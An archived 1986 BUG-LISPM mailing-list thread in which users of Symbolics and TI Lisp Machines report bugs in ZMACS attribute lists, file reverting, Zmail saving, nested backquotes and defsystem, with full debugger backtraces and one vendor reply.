   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:BREAK-INTERNAL:  (P.C. = 212)
   Arg 0 (SI:TAG): "ZMACS"
   Local 0 (SI:TAG): "Breakpoint ZMACS"
   Arg 1 (SI:CONDITIONAL): T
   --Defaulted args:--
   Arg 2: NIL

ZWEI:COM-BREAK:  (P.C. = 65)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-BREAK
   Arg 1 (ZWEI:CHAR): 129
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:PROCESS-COMMAND-CHAR:  (P.C. = 14)
   Arg 0 (ZWEI:CH): 129

(:METHOD ZWEI:EDITOR :EDIT):  (P.C. = 233)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:EDITOR -- 12. IV's, 0. FL's 120377766>
   Arg 2 (SI:OPERATION): :EDIT
   --Defaulted args:--
   Arg 3 (ZWEI:TOP-LEVEL-P): T
   Arg 4 (ZWEI:DESCRIPTION): NIL

(:METHOD ZWEI:TOP-LEVEL-EDITOR :COMBINED :EDIT):  (P.C. = 60)
   Arg 0 (SELF): #<ZMACS-TOP-LEVEL-EDITOR 144776776>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:TOP-LEVEL-EDITOR -- 13. IV's, 1. FL's 120377366>
   Arg 2 (SI:.OPERATION.): :EDIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMACS-WINDOW-TOP-LEVEL:  (P.C. = 51)

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   Arg 0 (IGNORE): NIL
14-Feb-86 10:01:35-EST,3013;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 Feb 86 10:01-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 14 FEB 86  10:01:38 EST
Received: from SCRC-STONY-BROOK.ARPA by MIT-REAGAN.ARPA via INTERNET with SMTP id 22926; 14 Feb 86 10:00:03-EST
Received: from THAMES.SCRC.Symbolics.COM by SCRC-STONY-BROOK.ARPA via CHAOS with CHAOS-MAIL id 417339; Fri 14-Feb-86 09:55:35-EST
Date: Fri, 14 Feb 86 09:59 EST
From: Scott McKay <SWM@SCRC-QUABBIN.ARPA>
Subject: Attribute Lists in ZMACS: Absolutely Disgusting
To: JCMA@MIT-AI.ARPA, BUG-LISPM@MIT-REAGAN.ARPA,
    bug-lispm@SCRC-STONY-BROOK.ARPA
cc: bug-relatus@MIT-MC.ARPA
In-Reply-To: <860214080642.6.JCMA@MIT-MORRISON.ARPA>
Message-ID: <860214095906.5.SWM@THAMES.SCRC.Symbolics.COM>

    Date: Fri, 14 Feb 86 08:06 EST
    From: JCMA@MIT-AI.ARPA

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
    AISite 11.12, Experimental RELATUS 145.61, microcode TMC5-MIC 336,
    FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

    I have been wading through various levels of screws with zmacs attribute lists
    while attempting to implement a new Relatus feature.  The major amount of time
    invloved is finding how the system code is screwing me.  It is a horrible
    kludge and must screw Symbolics implementors constantly.  Here is just one
    little example of the lossage.  While trying to frob the plist to remove bogus
    properties which the system puts back on the plist after my code removes them
    from both the buffer and the generic pathname, I find that some losing
    pathname code randomizes my argument to remprop.  Give me a break.  With
    kludges like this, it is a wonder your machine works AT ALL.  I don't expect
    it will work much longer either.  This crap is really disgusting and must
    waste incredible amounts of hacker time.

This is well known to be a horrible bag of kludges.  Yes, it does waste
hacker time.  Yes, it is on the queue of things to be fixed.  You can
expect to see an improvement in Release 7.

    If somebody wants to provide some customer support, I want to add a bunch of
    attributes to buffers. I want to change them and have the changes reflected in
    thwe string in the buffer.  I want ones equal to the default value to be
    removed from the buffer.  And I want random functions not to come along and
    randomize the values of these attributes on the attribute list.  Is this too
    much to ask?  (don't tell me it's a system internal.  Make and interface to
    it so nobody has to look at it again.)

    >>Error: The fourth argument (INDICATOR) to (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP), "MORRISON", was of the wrong type.
	     The function expected a symbol.
    While in the function (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP)  (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP)  SEND


14-Feb-86 15:04:47-EST,2121;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 14 Feb 86 15:04-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 14 FEB 86  14:54:19 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 22948; Fri 14-Feb-86 14:52:36-EST
Date: Fri, 14 Feb 86 14:53 EST
From: JCMA@MIT-AI.ARPA
Subject: Attribute Lists in ZMACS: Absolutely Disgusting
To: SWM@SCRC-QUABBIN.ARPA
cc: BUG-LISPM@MIT-REAGAN.ARPA, bug-lispm@SCRC-STONY-BROOK.ARPA,
    bug-relatus@MIT-MC.ARPA
In-Reply-To: <860214095906.5.SWM@THAMES.SCRC.Symbolics.COM>
Message-ID: <860214145359.8.JCMA@MIT-MORRISON.ARPA>

    Date: Fri, 14 Feb 86 09:59 EST
    From: Scott McKay <SWM@SCRC-QUABBIN.ARPA>

	Date: Fri, 14 Feb 86 08:06 EST
	From: JCMA@MIT-AI.ARPA

	In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
	AISite 11.12, Experimental RELATUS 145.61, microcode TMC5-MIC 336,
	FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
	FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

	I have been wading through various levels of screws with zmacs attribute lists
	while attempting to implement a new Relatus feature. 

    This is well known to be a horrible bag of kludges.  Yes, it does waste
    hacker time.  Yes, it is on the queue of things to be fixed.  You can
    expect to see an improvement in Release 7.

	If somebody wants to provide some customer support.

I should have expected as much.  Anyway
reagan:>relatus>utils>Kludge-Parse-Attribute-List.lisp makes
fs:parse-attribute-list using the type cache implicit in
ZWEI:*KNOWN-ATTRIBUTES* to allow a string type for attribute value.  You want
this or something better in rel 7.  I sure was tired of having everything made
into a keyword!  You know where to send the check.


	>>Error: The fourth argument (INDICATOR) to (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP), "MORRISON", was of the wrong type.
		 The function expected a symbol.
	While in the function (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP)  (:METHOD SI:PROPERTY-LIST-MIXIN :REMPROP)  SEND


15-Feb-86 14:00:55-EST,5786;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 15 Feb 86 14:00-EST
Received: from MULBERRY.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 24599; Sat 15-Feb-86 13:58:23-EST
Date: Saturday, 15 February 1986, 13:59-EST
From: nuth@ZERMATT
Subject: Bugs in TI v1.2 ZMACS
To: BUG-LISPM@ZERMATT

In SYSTEM 1.72, Compiler 1.9, File System 1.1,
Universal Command Loop 1.0, Window System 1.5, Input Editor 1.1,
ZMACS 1.2, font editor 1.0, Error Handler 1.0, Suggestions 1.0,
Debug Utilities 1.3, Explorer-Net 1.2, Telnet 1.0, VT100 1.0, ZMail 1.0,
Local-File 1.21, Net-Config 1.5, Explorer Serial & Parallel Ports 1.0,
Printer 1.0, Glossary 1.0, Explorer Streamer Tape 1.11, NVRAM 1.3,
User Profile Utility 1.2, microcode 214, Rel 1.0.2.19I, on MULBERRY:


Insert your description of the circumstances here:

I am using the function Find File No Sectionize to find a text file
from a UNIX machine. (The normal Find File function always tries to
sectionize my files, which blows up instead- but that's another story).
The Default Major Mode should be Text, since I have it set as such in 
my lispm-init & profile.
Since I'm using a borrowed machine, I can't just convert over to SYSTEM 2.0,
that's not an option.
Does a patch currently exist for this :REVERT method foolishness and
for the Sectionize bugs?
				Thanks,  PRN

>>TRAP 5240 (FUNCTION-ENTRY)
Function ZWEI:REVERT-FILE-BUFFER called with too many arguments (44).
Backtrace from the debugger:

ZWEI:REVERT-FILE-BUFFER (P.C. = 336)

 Arg 0 (BUFFER): #<ZMACS-BUFFER "Calendar //usr//nuth//schedule// VX:" 24260033>
 Arg 1 (PATHNAME): #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"
 Arg 2 (CONNECT-FLAG): ZWEI:NOSECTIONIZE
 Arg 3 (SELECT-FLAG): T
 Arg 4 (QUIETLY-FLAG): NIL
   --Extraneous args:--
 Arg 5: #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"
 Arg 6: "Calendar //usr//nuth//schedule// VX:"
 Arg 7: #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"
 Arg 8: ZWEI:ZETALISP-MODE
 Arg 9: #<FS:FILE-INPUT-CHARACTER-STREAM "VX: //usr//nuth//schedule//Calendar" 24260354>
 Arg 10: NIL
 Arg 11: #<FS:FILE-INPUT-CHARACTER-STREAM "VX: //usr//nuth//schedule//Calendar" 24260354>
 Arg 12: (NIL)
 Arg 13: (#<ZMACS-WINDOW-PANE Zmacs Window Pane 1 1503226 exposed>)
 Arg 14: :UNSPECIFIC
 Arg 15: NIL
 Arg 16: NIL
 Arg 17: (" 2//16//86       *      	Pool 13-17  Rink 9-10, 13-17" 0 :NORMAL)
 Arg 18: 1
 Arg 19: 784
 Arg 20: NIL
 Arg 21: NIL
 Arg 22: #<ZWEI:INTERVAL-STREAM 24260555>
 Arg 23: 17
 Arg 24: ""
 Arg 25: T
 Arg 26: #<ZMACS-WINDOW-PANE Zmacs Window Pane 1 1503226 exposed>
 Arg 27: NIL
 Arg 28: NIL
 Arg 29: NIL
 Arg 30: NIL
 Arg 31: NIL
 Arg 32: NIL
 Arg 33: NIL
 Arg 34: 198
 Arg 35: 5242880
 Arg 36: 701
 Arg 37: 2097152
 Arg 38: #<DTP-LOCATIVE 15320500>
 Arg 39: 1179908
 Arg 40: 1059884
 Arg 41: 0
 Arg 42: 0
 Arg 43: NIL
 Local 0 (GENERIC-PATHNAME): #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"
 Local 1 (PATHNAME-STRING): "Calendar //usr//nuth//schedule// VX:"
 Local 2 (TRUENAME): #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"
 Local 3 (NEW-MODE): ZWEI:ZETALISP-MODE
 Local 4: #<FS:FILE-INPUT-CHARACTER-STREAM "VX: //usr//nuth//schedule//Calendar" 24260354>
 Local 5 (.FILE-ABORTED-FLAG.): NIL
 Local 6 (STREAM): #<FS:FILE-INPUT-CHARACTER-STREAM "VX: //usr//nuth//schedule//Calendar" 24260354>
 Local 7: (NIL)
 Local 8: (#<ZMACS-WINDOW-PANE Zmacs Window Pane 1 1503226 exposed>)
 Local 9 (THIS-VERSION): :UNSPECIFIC
 Local 10 (INSTALLED-TRUENAME): NIL
 Local 11 (INSTALLED-VERSION): NIL
 Local 12 (SAVED-POINT): (" 2//16//86       *      	Pool 13-17  Rink 9-10, 13-17" 0 :NORMAL)
 Local 13 (NLINES): 1
 Local 14 (NCHARS): 784
 Local 15 (FONTS): NIL
 Local 16 (FONTS-P): NIL
 Local 17 (BUFFER-STREAM): #<ZWEI:INTERVAL-STREAM 24260555>
 Local 18 (I): 17
 Local 19 (LINE): ""
 Local 20 (EOFFLG): T
 Local 21 (WINDOW): #<ZMACS-WINDOW-PANE Zmacs Window Pane 1 1503226 exposed>
 Local 22 (STREAM): NIL
 Local 23 (.SELECTQ.ITEM.): NIL
 Local 24 (MODE): NIL


(:METHOD ZWEI:ZMACS-BUFFER :REVERT) (P.C. = 44)
  (SELF is #<ZMACS-BUFFER "Calendar //usr//nuth//schedule// VX:" 24260033>)

 Arg 0 (.OPERATION.): :REVERT
 Arg 1 (NEW-PATHNAME): #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"
 Arg 2 (CONNECT-FLAG): ZWEI:NOSECTIONIZE
 Arg 3 (SELECT-FLAG): T
 Arg 4 (QUIETLY-FLAG): NIL


ZWEI:REVERT-BUFFER (P.C. = 66)

 Arg 0 (BUFFER): #<ZMACS-BUFFER "Calendar //usr//nuth//schedule// VX:" 24260033>
 Arg 1 (PATHNAME): #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"
 Arg 2 (CONNECT-FLAG): ZWEI:NOSECTIONIZE
 Arg 3 (SELECT-FLAG): T
 Arg 4 (QUIETLY-FLAG): NIL


ZWEI:FIND-FILE (P.C. = 252)

 Arg 0 (PATHNAME): #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"
 Arg 1 (SELECT-P): T
 Arg 2 (QUIETLY): NIL
 Arg 3 (LOAD-P): T
 Arg 4 (DONT-SECTIONIZE): T
 Local 0 (BUFFER): #<ZMACS-BUFFER "Calendar //usr//nuth//schedule// VX:" 24260033>
 Local 1 (STREAM): NIL
 Local 2 (OLD-DESC): NIL
 Local 3 (NEW-DESC): NIL


ZWEI:COM-FIND-FILE-NO-SECTIONIZE (P.C. = 55)

 Local 0 (PATHNAME): #FS:UNIX-PATHNAME "VX: //usr//nuth//schedule//Calendar"


Remainder of stack:

ZWEI:COMMAND-EXECUTE (P.C. = 104)
ZWEI:MAKE-EXTENDED-COMMAND-INTERNAL (P.C. = 72)
ZWEI:MAKE-EXTENDED-COMMAND-INTERNAL (P.C. = 73)
ZWEI:COMMAND-EXECUTE (P.C. = 104)
ZWEI:PROCESS-COMMAND-CHAR (P.C. = 65)
(:METHOD ZWEI:WINDOW :EDIT) (P.C. = 514)
(:INTERNAL (:METHOD ZWEI:ZMACS-WINDOW :COMBINED :EDIT) 0) (P.C. = 74)
FUNCALL (P.C. = 25)
(:METHOD ZWEI:DISPLAYER :AROUND :EDIT) (P.C. = 31)
(:METHOD ZWEI:ZMACS-WINDOW :COMBINED :EDIT) (P.C. = 47)
ZWEI:ZMACS-WINDOW-TOP-LEVEL (P.C. = 74)
SI:PROCESS-TOP-LEVEL (P.C. = 244)
16-Feb-86 00:48:10-EST,3887;000000000000
Received: from DUE-PROCESS.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 16 Feb 86 00:48-EST
Date: Sun, 16 Feb 86 00:47 EST
From: Carl Hewitt <Hewitt@MIT-XX.ARPA>
Subject: bug in Zmail, timing error
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860216004756.0.HEWITT@DUE-PROCESS.AI.MIT.EDU>


In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.1, Macsyma 310.35, microcode TMC5-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Due Process:

I accidently hit [save] before all the new messages had been digested.
Is there any way to recover?

>>Error: Preparing to save buffer XX:PS:<HEWITT>HEWITT.BABYL,
         but associated inbox XX:PS:<HEWITT>MAIL.TXT.1 is not awaiting save.
         Buffer status = :SAVING-REQUIRED, inbox status = :AWAITING-BUFFER.
While in the function ZWEI:MAIL-BUFFER-SAVE-SETUP  ZWEI:SAVE-BUFFER-INTERNAL  ZWEI:SAVE-MAIL-BUFFER

ZWEI:MAIL-BUFFER-SAVE-SETUP:  (P.C. = 35)
   Arg 0 (ZWEI:BUFFER): #<BABYL-BUFFER "XX:PS:<HEWITT>HEWITT.BABYL" 14036433>
   Arg 1 (ZWEI:CHECK-ONLY): NIL
   Arg 2 (ZWEI:NO-OUTPUT): NIL
   Local 3: NIL
   Local 4 (ZWEI:OTHER): #<TENEX-INBOX-BUFFER "XX:PS:<HEWITT>MAIL.TXT.1" 26515362>
   Local 5 (ZWEI:OTHER-STATUS): :AWAITING-BUFFER
   Local 6 (STATUS): :SAVING-REQUIRED

ZWEI:SAVE-BUFFER-INTERNAL:  (P.C. = 32)
   Arg 0 (ZWEI:BUFFER): #<BABYL-BUFFER "XX:PS:<HEWITT>HEWITT.BABYL" 14036433>
   Arg 1 (ZWEI:FOR-FINISH): NIL

ZWEI:SAVE-MAIL-BUFFER:  (P.C. = 111)
   Arg 0 (ZWEI:BUFFER): #<BABYL-BUFFER "XX:PS:<HEWITT>HEWITT.BABYL" 14036433>
   --Defaulted args:--
   Arg 1 (ZWEI:FOR-FINISH): NIL

ZWEI:ZMAIL-SAVE-ALL:  (P.C. = 46)

ZWEI:COM-ZMAIL-SAVE:  (P.C. = 16)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-ZMAIL-SAVE
   Arg 1 (ZWEI:CHAR): (:MENU ("Save" . ZWEI:COM-ZMAIL-SAVE) 1 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 5 43207055 exposed>)
   --Defaulted args:--
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:ZMAIL-COMMAND-EXECUTE:  (P.C. = 6)
   Arg 0: ZWEI:COM-ZMAIL-SAVE

(:INTERNAL ZWEI:ZMAIL-COMMAND-LIST 0 (:MENU)):  (P.C. = 10)
   Arg 0 (SI:**DEFSELECT-OP**): :MENU
   Arg 1 (ZWEI:ITEM): ("Save" . ZWEI:COM-ZMAIL-SAVE)
   Arg 2 (ZWEI:CH): 1
   Arg 3 (ZWEI:WINDOW): #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 5 43207055 exposed>

ZWEI:ZMAIL-COMMAND-LIST:  (P.C. = 12)
   Arg 0 (SI:OPERATION): :MENU
   Rest arg (SI:SELECT-METHOD-ARGS): (("Save" . ZWEI:COM-ZMAIL-SAVE) 1 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 5 43207055 exposed>)

(:METHOD ZWEI:ZMAIL-FRAME :PROCESS-SPECIAL-COMMAND):  (P.C. = 16)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :PROCESS-SPECIAL-COMMAND
   Rest arg (ARGS): (:MENU ("Save" . ZWEI:COM-ZMAIL-SAVE) 1 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 5 43207055 exposed>)

(:METHOD ZWEI:ZMAIL-FRAME :COMMAND-LOOP):  (P.C. = 136)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :COMMAND-LOOP

(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :COMMAND-LOOP):  (P.C. = 70)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :COMMAND-LOOP
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMAIL-PROCESS-TOP-LEVEL:  (P.C. = 105)
   Arg 0 (ZWEI:WINDOW): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
16-Feb-86 14:58:39-EST,2977;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 16 Feb 86 14:58-EST
Received: from JOE-LOUIS.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 24658; Sun 16-Feb-86 14:56:10-EST
Date: Sun, 16 Feb 86 14:58 EST
From: David A. McAllester <DAM@OZ.AI.MIT.EDU>
Subject: nested backquotes mess up
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860216145805.1.DAM@JOE-LOUIS.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, Experimental McFlavors 5.0,
microcode TMC5-MIC 336, FEP 17, on Lisp Machine Joe Louis:



consider the following

(setq x 'a)
(setq y 'b)
(setq z '(c d))

(setq args '(x y z))

(eval ``,(list* ,@args))

;``,(list* ,@args) should evaluate to `,(list* x y z) which should evaluate to (a b c d)

;instead the system evaluates (si:xr-bq-cons x y z) which gives an error.





>>Error: Incorrect arguments to SI:XR-BQ-CONS:
         The macro's argument pattern (CAR CDR)
         does not match the form (SI:XR-BQ-CONS USER:X USER:Y USER:Z).
While in the function SI:XR-BQ-CONS  FUNCALL  SI:EVAL-MACRO

SI:XR-BQ-CONS:  (P.C. = 16)
   Arg 0 (SI:.FORM.): (SI:XR-BQ-CONS USER:X USER:Y USER:Z)
   Arg 1 (SI:.ENV.): NIL
   Local 2 (CDR): SI:XR-BQ-CONS
   Local 3 (CAR): (CAR CDR)

FUNCALL:  (P.C. = 5)
   Arg 0 (SI:FN): #<DTP-COMPILED-FUNCTION SI:XR-BQ-CONS 2200244>
   Rest arg (ARGS): ((SI:XR-BQ-CONS USER:X USER:Y USER:Z) NIL)

SI:EVAL-MACRO:  (P.C. = 46)
   Arg 0 (SI:EXPANDER): #<DTP-COMPILED-FUNCTION SI:XR-BQ-CONS 2200244>
   Arg 1 (SI:FORM): (SI:XR-BQ-CONS USER:X USER:Y USER:Z)
   Arg 2 (SI:ENV): NIL

SI:*EVAL:  (P.C. = 134)
   Arg 0 (SI:FORM): (SI:XR-BQ-CONS USER:X USER:Y USER:Z)
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (EVAL (SI:XR-BQ-CONS (QUOTE SI:XR-BQ-CONS) ARGS))
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

RESTART-EVAL:  (P.C. = 44)  (from B:>dam>prover>modulate)
   Arg 0 (FORM): (EVAL (SI:XR-BQ-CONS (QUOTE SI:XR-BQ-CONS) ARGS))

READ-EVAL-PRINT:  (P.C. = 61)  (from B:>dam>prover>modulate)

(LAMBDA NIL (IN-CONTEXT NIL (READ-EVAL-PRINT))):
   --Extraneous args:--
   Arg 0: NIL

Rest of stack:
IN-FRAME-INTERNAL:  (P.C. = 16)  (from B:>dam>prover>modulate)
IN-FRAME:  (P.C. = 14)  (from B:>dam>prover>modulate)
SI:*EVAL:  (P.C. = 401)
RESTART-EVAL:  (P.C. = 44)  (from B:>dam>prover>modulate)
READ-EVAL-PRINT:  (P.C. = 61)  (from B:>dam>prover>modulate)
(LAMBDA NIL (IN-CONTEXT NIL (READ-EVAL-PRINT))):
IN-FRAME-INTERNAL:  (P.C. = 16)  (from B:>dam>prover>modulate)
IN-FRAME:  (P.C. = 11)  (from B:>dam>prover>modulate)
SI:*EVAL:  (P.C. = 401)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
SI:LISP-TOP-LEVEL1:  (P.C. = 5)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
16-Feb-86 16:55:23-EST,3190;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 16 Feb 86 16:55-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 16 FEB 86  16:55:40 EST
Received: from MIT-ZERMATT.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 23045; Sun 16-Feb-86 16:54:46-EST
Received: from JOE-LOUIS.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 24666; Sun 16-Feb-86 16:52:27-EST
Date: Sun, 16 Feb 86 16:54 EST
From: David A. McAllester <DAM@OZ.AI.MIT.EDU>
Subject: a case where nested backquotes fail
To: bug-lispm@MIT-REAGAN.ARPA
Message-ID: <860216165425.3.DAM@JOE-LOUIS.MIT.EDU>


In Symbolics 3600 Release 6.1, IP-TCP 29.13, Experimental McFlavors 5.0,
microcode TMC5-MIC 336, FEP 17, on Lisp Machine Joe Louis:


consider the following

(setq x 'a)
(setq y 'b)
(setq z '(c d))

(setq args '(x y z))

(eval ``,(list* ,@args))

;``,(list* ,@args) should evaluate to `,(list* x y z) which should evaluate to (a b c d)

;instead the system evaluates (si:xr-bq-cons x y z) which gives an error.





>>Error: Incorrect arguments to SI:XR-BQ-CONS:
         The macro's argument pattern (CAR CDR)
         does not match the form (SI:XR-BQ-CONS USER:X USER:Y USER:Z).
While in the function SI:XR-BQ-CONS  FUNCALL  SI:EVAL-MACRO

SI:XR-BQ-CONS:  (P.C. = 16)
   Arg 0 (SI:.FORM.): (SI:XR-BQ-CONS USER:X USER:Y USER:Z)
   Arg 1 (SI:.ENV.): NIL
   Local 2 (CDR): SI:XR-BQ-CONS
   Local 3 (CAR): (CAR CDR)

FUNCALL:  (P.C. = 5)
   Arg 0 (SI:FN): #<DTP-COMPILED-FUNCTION SI:XR-BQ-CONS 2200244>
   Rest arg (ARGS): ((SI:XR-BQ-CONS USER:X USER:Y USER:Z) NIL)

SI:EVAL-MACRO:  (P.C. = 46)
   Arg 0 (SI:EXPANDER): #<DTP-COMPILED-FUNCTION SI:XR-BQ-CONS 2200244>
   Arg 1 (SI:FORM): (SI:XR-BQ-CONS USER:X USER:Y USER:Z)
   Arg 2 (SI:ENV): NIL

SI:*EVAL:  (P.C. = 134)
   Arg 0 (SI:FORM): (SI:XR-BQ-CONS USER:X USER:Y USER:Z)
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (EVAL (SI:XR-BQ-CONS (QUOTE SI:XR-BQ-CONS) ARGS))
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

RESTART-EVAL:  (P.C. = 44)  (from B:>dam>prover>modulate)
   Arg 0 (FORM): (EVAL (SI:XR-BQ-CONS (QUOTE SI:XR-BQ-CONS) ARGS))

READ-EVAL-PRINT:  (P.C. = 61)  (from B:>dam>prover>modulate)

(LAMBDA NIL (IN-CONTEXT NIL (READ-EVAL-PRINT))):
   --Extraneous args:--
   Arg 0: NIL

Rest of stack:
IN-FRAME-INTERNAL:  (P.C. = 16)  (from B:>dam>prover>modulate)
IN-FRAME:  (P.C. = 14)  (from B:>dam>prover>modulate)
SI:*EVAL:  (P.C. = 401)
RESTART-EVAL:  (P.C. = 44)  (from B:>dam>prover>modulate)
READ-EVAL-PRINT:  (P.C. = 61)  (from B:>dam>prover>modulate)
(LAMBDA NIL (IN-CONTEXT NIL (READ-EVAL-PRINT))):
IN-FRAME-INTERNAL:  (P.C. = 16)  (from B:>dam>prover>modulate)
IN-FRAME:  (P.C. = 11)  (from B:>dam>prover>modulate)
SI:*EVAL:  (P.C. = 401)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
SI:LISP-TOP-LEVEL1:  (P.C. = 5)
SI:PROCESS-TOP-LEVEL:  (P.C. = 54)


17-Feb-86 16:28:37-EST,5606;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 17 Feb 86 16:28-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 17 FEB 86  16:28:28 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 23087; Mon 17-Feb-86 16:27:51-EST
Date: Mon, 17 Feb 86 16:27 EST
From: JCMA@MIT-AI.ARPA
Subject: When is defsystem going to
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860217162747.8.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 11.12, Experimental RELATUS 145.66, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:

know that people occaisionally add new files to systems, and therefore, that
no binary will exist when a system compilation is done.

>>Error: The file was not found.
         For B:>relatus>gnoscere>deictic-interface.lisp
